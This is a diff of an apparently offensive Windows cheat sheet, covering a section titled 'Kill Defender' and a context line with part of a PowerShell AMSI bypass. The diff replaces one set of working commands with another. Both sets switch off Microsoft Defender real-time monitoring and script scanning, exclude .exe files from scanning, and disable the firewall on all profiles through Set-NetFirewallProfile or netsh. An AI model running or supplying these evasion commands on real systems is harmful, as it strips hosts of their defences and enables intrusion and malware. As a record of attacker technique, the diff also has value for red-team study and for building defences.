@@ -55,9 +55,12 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 ```
 
 # Kill Defender
+
 ```
-Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+Disable firewall - New way	netsh advfirewall set allprofiles state off
+Firewall rules	netsh advfirewall firewall show rule name=all
+Add-MpPreference -ExclusionExtension ".exe"
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 
